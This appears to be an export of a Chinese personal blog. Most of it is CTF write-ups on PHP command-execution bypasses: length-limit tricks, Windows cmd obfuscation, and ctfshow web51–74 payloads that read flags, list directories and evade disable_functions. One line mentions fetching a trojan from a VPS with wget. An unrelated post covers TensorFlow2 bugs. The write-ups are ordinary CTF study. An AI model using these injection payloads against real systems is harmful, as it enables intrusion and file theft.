class="title">your</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
<p>用这种方法可以绕过一些长度限制读取文件内容</p>
<h3 id="利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过"><a href="#利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过" class="headerlink" title="利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)"></a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3><p>在<code>linux</code>中，我们使用<code>ls -t</code>命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">b</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">c</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span></span></span><br><span class="line"><span class="function"><span class="title">c</span>  <span class="title">b</span>  <span class="title">a</span></span></span><br></pre></td></tr></table></figure>
<p>我们来看看<code>ls -t&gt;ghtwf01</code>有什么效果(开始不存在<code>ghtwf01</code>这个文件)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span>&gt;<span class="title">ghtwf01</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">cat</span> <span class="title">ghtwf01</span> </span></span><br><span class="line"><span class="function"><span class="title">ghtwf01</span></span></span><br><span class="line"><span class="function"><span class="title">c</span></span></span><br><span class="line"><span class="function"><span class="title">b</span></span></span><br><span class="line"><span class="function"><span class="title">a</span></span></span><br></pre></td></tr></table></figure>
<p>这条命令先执行了创建<code>ghtwf01</code>文件然后将<code>ls -t</code>的执行结果写入<code>ghtwf01</code>文件<br>我们试试用这些方法来执行命令<code>cat flag</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># &gt; &quot;<span class="title">ag</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">fl</span>\\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">t</span> \\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">ca</span>\\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span></span></span><br><span class="line"><span class="function">&#x27;<span class="title">ca</span>\&#x27;  &#x27;<span class="title">t</span> \&#x27;  &#x27;<span class="title">fl</span>\&#x27;   <span class="title">ag</span>   <span class="title">flag</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span> &gt; <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">sh</span> <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">a</span>: 1: <span class="title">a</span>: <span class="title">not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span></span></span><br><span class="line"><span class="function"><span class="title">a</span>: 6: <span class="title">flag</span>: <span class="title">not</span> <span class="title">found</span></span></span><br></pre></td></tr></table></figure>
<p>读取到了<code>flag</code>内容为<code>this is your flag</code>，无论这个文件里面有不有其它内容都能执行<br>总而言之文件构造绕过就是如下知识：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">linux下可以用 <span class="number">1</span>&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
<p>反弹<code>shell</code>命令比较长就可以用这种方式去绕过长度限制<br>如果服务器能连外网还可以使用命令<code>wget 网址 -O shell.php</code>去执行我们自己<code>vps</code>上面的木马文件</p>
<h3 id="无字母数字绕过"><a href="#无字母数字绕过" class="headerlink" title="无字母数字绕过"></a>无字母数字绕过</h3><p>我学了，啥都看不懂，有什么好说的。</p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5501">羽师傅博客：无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神博客：无字母数字webshell之提高篇</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神博客：一些不包含数字和字母的webshell</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">Firebasky博客：无字母数字的命令执行(ctfshow web入门 55）</a></p>
<h2 id="Windows绕过姿势"><a href="#Windows绕过姿势" class="headerlink" title="Windows绕过姿势"></a>Windows绕过姿势</h2><h3 id="符号与命令"><a href="#符号与命令" class="headerlink" title="符号与命令"></a>符号与命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;&#x2F;正常执行</span><br><span class="line">w&quot;h&quot;o&quot;a&quot;m&quot;i 或&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;或&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i或w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;&#x2F;&#x2F;正常执行</span><br><span class="line">who^ami或wh&quot;&quot;o^a^mi 或wh&quot;&quot;o^a^mi&quot;&#x2F;&#x2F;正常执行</span><br><span class="line">但是&quot;wh&quot;&quot;o^a^mi&quot;这种在开头就有单引号的情况是不能执行的</span><br><span class="line">(Whoami)或(Wh^o^am&quot;&quot;i)或((((Wh^o^am&quot;&quot;i)))) &#x2F;&#x2F;正常执行  注:可以加无数个&quot;但不能同时连续加2个^符号，因为^号是cmd中的转义符，跟在他后面的符号会被转义</span><br></pre></td></tr></table></figure>
<h3 id="管道符-1"><a href="#管道符-1" class="headerlink" title="管道符"></a>管道符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|        &#x2F;&#x2F;直接执行后面的语句</span><br><span class="line">||       &#x2F;&#x2F;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;       &#x2F;&#x2F;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
<h3 id="set命令"><a href="#set命令" class="headerlink" title="set命令"></a>set命令</h3><p><em>知识点:用两个%括起来的变量,会输出变量的值</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;1     &#x2F;&#x2F;设置变量a，值为1</span><br><span class="line">echo a      &#x2F;&#x2F;此时输出结果为&quot;a&quot;</span><br><span class="line">echo %a%    &#x2F;&#x2F;此时输出结果为&quot;1&quot;</span><br></pre></td></tr></table></figure>
<p>接下来的进阶利用就是:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;who</span><br><span class="line">set b&#x3D;ami</span><br><span class="line">%a%%b% &#x2F;&#x2F;正常执行whoami</span><br><span class="line">call %a%%b% &#x2F;&#x2F;正常执行whoami</span><br></pre></td></tr></table></figure>
<p>所以,上述的符号与命令部分的所有操作,都可以通过set来实现,只需要慢慢拼接就ok</p>
<h3 id="切割字符："><a href="#切割字符：" class="headerlink" title="切割字符："></a>切割字符：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;whoami</span><br><span class="line">%a:~0%     &#x2F;&#x2F;取出所有字符,所以正常执行命令</span><br><span class="line">%a:~0,6%   &#x2F;&#x2F;从开始切割6个字符,刚好是whoami,所以正常执行</span><br><span class="line">%a:~0,5%   &#x2F;&#x2F;切割后是whoam,不是系统命令,不能执行</span><br></pre></td></tr></table></figure>
<p>注:上述可以使用减号,和python的切割效果差不多</p>
<p>所以,可以考虑的东西就来了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;abc qwe     &#x2F;&#x2F;先自定义</span><br><span class="line">wh^o^%a:~0,1%mi   &#x2F;&#x2F;然后截断整理后就变成了:wh^o^ami,所以命令执行成功</span><br></pre></td></tr></table></figure>
<p>可以简单地写出webshell</p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="http://blog.leanote.com/post/bowu/de8babf67fd8">Bowu博客：CTF之命令执行绕过总结</a></p>
<p><a href="https://www.cnblogs.com/NPFS/p/13279815.html">NPFS博客：命令执行绕过小技巧</a></p>
<p><a href="https://www.ghtwf01.cn/index.php/archives/273/">ghtwf01博客：命令执行漏洞利用及绕过方式总结</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5501">羽师傅博客：无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神博客：无字母数字webshell之提高篇</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神博客：一些不包含数字和字母的webshell</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">Firebasky博客：无字母数字的命令执行(ctfshow web入门 55）</a></p>
<p>还有文中直接引用的博客部分。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行绕过disable_functions</title>
    <url>/2021/04/19/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87disable_functions/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行绕过disable-functions"><a href="#ctfshow命令执行绕过disable-functions" class="headerlink" title="ctfshow命令执行绕过disable_functions"></a>ctfshow命令执行绕过disable_functions</h1><p>船新版本，绕过禁用函数。</p>
<span id="more"></span>
<h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>绕过disable_function，那我们先看一下phpinfo() ，然后发现被禁了？？？<del>那还绕什么，关闭浏览器</del></p>
<p>整理一下payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;高亮显示php文件</span><br><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br><span class="line">c&#x3D;highlight_file(&quot;flag.php&quot;);</span><br><span class="line">&#x2F;&#x2F;通过复制，重命名读取php文件内容（函数执行后，访问url&#x2F;flag.txt）</span><br><span class="line">copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);          </span><br><span class="line">rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);        </span><br><span class="line">&#x2F;&#x2F;单一函数读文件内容：</span><br><span class="line">echo file_get_contents(&quot;flag.php&quot;);   </span><br><span class="line">readfile(&quot;flag.php&quot;);                      </span><br><span class="line">print_r(file(&quot;flag.php&quot;)); </span><br><span class="line">&#x2F;&#x2F;文件包含绕过：</span><br><span class="line">post:c&#x3D;include($_GET[1]);</span><br><span class="line">get:?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>再贴出羽师傅的一些其他操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">用法：</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetss($a);echo $line;&#125;       &#x2F;&#x2F;php7.3版本后 该函数已不再被使用</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);                                      &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);                                   &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgets($a);echo $line;&#125;        &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetc($a);echo $line;&#125;        &#x2F;&#x2F;过60</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);print_r($line);&#125;  &#x2F;&#x2F;过60</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag不在flag.php中,需要先查找flag所在的位置</span><br><span class="line">scandir()</span><br><span class="line">opendir()</span><br><span class="line">用法</span><br><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));highlight_file(&quot;&#x2F;flag.txt&quot;);                                                           &#x2F;&#x2F;过66-67</span><br><span class="line">c&#x3D;$a&#x3D;opendir(&quot;&#x2F;&quot;); while (($file &#x3D; readdir($a)) !&#x3D;&#x3D; false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;highlight_file(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-67</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后面因为是txt文件，所以直接用include直接包含就能显示flag</span><br><span class="line">include()</span><br><span class="line">require()</span><br><span class="line">用法：</span><br><span class="line">include(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-70</span><br><span class="line">require(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-70</span><br></pre></td></tr></table></figure>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
</blockquote>
<h2 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h2><h3 id="1、题目："><a href="#1、题目：" class="headerlink" title="1、题目："></a>1、题目：</h3><p>同上。</p>
<h3 id="2、解答："><a href="#2、解答：" class="headerlink" title="2、解答："></a>2、解答：</h3><p>没变，但是flag不在当前文件夹下了。需要扫目录：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">c&#x3D;print_r(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
<p>扫出目录后highlight_file()即可</p>
<h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><p>ban了highlight_file()</p>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>试试include(‘/flag.php’) 发现太大出不来。考虑到flag应该在根目录下的flag.txt里，于是直接用包含做。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;include_once(&#39;&#x2F;flag.txt&#39;);</span><br></pre></td></tr></table></figure>
<p>扩展：扫目录函数被ban完了。记录下Y4的扫目录操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>
<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<p>官方介绍：</p>
<blockquote>
<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
</blockquote>
<p>利用exit，停止后面的程序</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;require(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<h2 id="web72（不会）"><a href="#web72（不会）" class="headerlink" title="web72（不会）"></a>web72（不会）</h2><p>不会，之后学</p>
<h2 id="web73、74"><a href="#web73、74" class="headerlink" title="web73、74"></a>web73、74</h2><p>文件不再是flag.txt了，需要自己扫，但是扫的东西ban了一大半。</p>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>通过glob遍历目录：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;?&gt;&lt;?php</span><br><span class="line">	$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#39; &#39;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>扫出来一回正常文件包含梭了。</p>
<p>能做的题都在这了，之后会总结一下命令执行的操作和姿势。</p>
<h2 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote>
<p><a href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
<p><a href="https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501">https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
</blockquote>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>运用tensorflow2在人脸识别中遇到的问题和bug</title>
    <url>/2021/04/17/%E8%BF%90%E7%94%A8tensorflow2%E5%9C%A8%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8Cbug/</url>
    <content><![CDATA[<h1 id="运用tensorflow2在人脸识别中遇到的问题和bug"><a href="#运用tensorflow2在人脸识别中遇到的问题和bug" class="headerlink" title="运用tensorflow2在人脸识别中遇到的问题和bug"></a>运用tensorflow2在人脸识别中遇到的问题和bug</h1><p>之前做科创项目时遇到的一些问题的解决方案，特此记录。</p>
<span id="more"></span>
<h2 id="bug1：TensorFlow2与TensorFlow1不兼容的问题。"><a href="#bug1：TensorFlow2与TensorFlow1不兼容的问题。" class="headerlink" title="bug1：TensorFlow2与TensorFlow1不兼容的问题。"></a>bug1：TensorFlow2与TensorFlow1不兼容的问题。</h2><p>这是目前最为常见的问题，由于卷积神经网络最火的时间在18年，当时产出了大量优质的项目和开源代码供使用。但如果今日想要复现当时的成果时，会遭遇TensorFlow和python版本更新后不兼容的问题。</p>
<p>推测当时版本：TensorFlow1，python3.6</p>
<p>根据网上报错的解答，可以得知TensorFlow1.13版本不兼容python3.7环境，偌使用python3.7环境，建议将TensorFlow更新至1.15。</p>
<p>本机环境采用的TensorFlow2.0版本</p>
<h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><p>既然问题已经非常明显了，当遇到报错提示为(此类型通用)</p>
<p><code>AttributeError: module &#39;tensorflow&#39; has no attribute</code></p>
<p>意味着TensorFlow2中不再有改模块。</p>
<h5 id="给出两种解决方案："><a href="#给出两种解决方案：" class="headerlink" title="给出两种解决方案："></a>给出两种解决方案：</h5><p>1、卸载当前版本TensorFlow，回到源代码版本的TensorFlow</p>
<p>2、将以下代码进行修改：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br></pre></td></tr></table></figure>
<p>改为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow.compat.v1 <span class="keyword">as</span> tf</span><br><span class="line">tf.disable_v2_behavior()</span><br></pre></td></tr></table></figure>
<p>此法可以解决90%的报错。但是有一个例外，也就是<u><strong>contrib</strong></u>模块。</p>
<p>此模块的解决方案：建议回TensorFlow1+python3.6，或者根据官方文档及上述引用链接自行修改。</p>
<p><strong>4月20日更新：</strong></p>
<p>contrib模块中的slim已经没了，如果需要调用slim模块，需要</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install tf_slim</span><br></pre></td></tr></table></figure>
<p>将配置文件中的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">slim = tf.contrib.slim()</span><br></pre></td></tr></table></figure>
<p>全部改为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">slim = tf_slim()</span><br></pre></td></tr></table></figure>
<p>且加上关闭TensorFlow2功能的相关语句。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/kyle1314608/article/details/100594884">https://blog.csdn.net/kyle1314608/article/details/100594884</a></p>
</blockquote>
<h2 id="bug2-cv2-imread-读取图片返回none。"><a href="#bug2-cv2-imread-读取图片返回none。" class="headerlink" title="bug2:cv2.imread()读取图片返回none。"></a>bug2:cv2.imread()读取图片返回none。</h2><p>读取图片返回空，会直接导致后期图片处理出问题，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cv2.error: OpenCV(3.4.3) C:\projects\opencv-python\opencv\modules\imgproc\src\resize.cpp:4044: error: (-215:Assertion failed) !ssize.empty() in function &#39;cv::resize’</span><br></pre></td></tr></table></figure>
<h3 id="解决方案：-1"><a href="#解决方案：-1" class="headerlink" title="解决方案："></a>解决方案：</h3><h4 id="原因1：图片路径形式书写错误"><a href="#原因1：图片路径形式书写错误" class="headerlink" title="原因1：图片路径形式书写错误"></a>原因1：图片路径形式书写错误</h4><p>\在程序中为转义符号，不可用错</p>
<p>OpenCV读取路径单路径即可，不需要 // </p>
<p>错误的形式：C:\Users\Desktop\test<br>正确的应该：C:/Users/Desktop/test/</p>
<h4 id="原因2：图片路径没有写全"><a href="#原因2：图片路径没有写全" class="headerlink" title="原因2：图片路径没有写全"></a>原因2：图片路径没有写全</h4><p>具体图片精确到 .jpg/.png</p>
<p>具体文件夹精确到：test/</p>
<p>正确的应该：C:/Users/Desktop/test/</p>
<h4 id="原因3：路径中带中文"><a href="#原因3：路径中带中文" class="headerlink" title="原因3：路径中带中文"></a>原因3：路径中带中文</h4><p>路径中绝对绝对绝对绝对绝对绝对不要有任何<strong><em><u>中文</u></em></strong>！！！特别是python3环境下</p>
<h4 id="原因4：图片数量不一致"><a href="#原因4：图片数量不一致" class="headerlink" title="原因4：图片数量不一致"></a>原因4：图片数量不一致</h4><p>你有多少图片，就搞多少图片，别自己变图片出来。</p>
<p>主要在循环遍历时才会遇到这个问题</p>
<h3 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/m0_37882192/article/details/108738901">https://blog.csdn.net/m0_37882192/article/details/108738901</a></p>
</blockquote>
<h2 id="bug3-checkpoint文件内部设置。"><a href="#bug3-checkpoint文件内部设置。" class="headerlink" title="bug3:checkpoint文件内部设置。"></a>bug3:checkpoint文件内部设置。</h2><p>以我的为参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G:&#x2F;science&#x2F;trainmodel&#x2F;model-600</span><br></pre></td></tr></table></figure>
<p>注意 ‘ / ‘ 以及模型不带后缀。</p>
<p>另外，训练时生成模型使用的函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">saver.save(sess, <span class="string">&#x27;G:/science/trainmodel/model&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>中的路径部分采用windows格式的 ‘ / ‘即可，我之前写python路径写顺手了，直接写了全部 // ，直接GG</p>
<h2 id="bug4-saver-restore恢复模型报错"><a href="#bug4-saver-restore恢复模型报错" class="headerlink" title="bug4:saver.restore恢复模型报错"></a>bug4:saver.restore恢复模型报错</h2><p>经典坑位之一，附上我的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">saver.restore(sess, tf.train.latest_checkpoint(<span class="string">&#x27;G:/science/trainmodel&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>tf.train一行指调用生成的最后一个模型，还有多种参数可以按需使用。</p>
<p>路径单双斜杠均不受影响。</p>
]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行51-57</title>
    <url>/2021/04/14/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C51-57/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行51-57"><a href="#ctfshow命令执行51-57" class="headerlink" title="ctfshow命令执行51-57"></a>ctfshow命令执行51-57</h1><p>ctfshow中web入门命令执行篇的一些刷题笔记</p>
<span id="more"></span>
<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>相较50过滤了更多东西，尤其是tac 。。。泪目</p>
<p>payload：<code>nl&lt;fl\ag.php||</code></p>
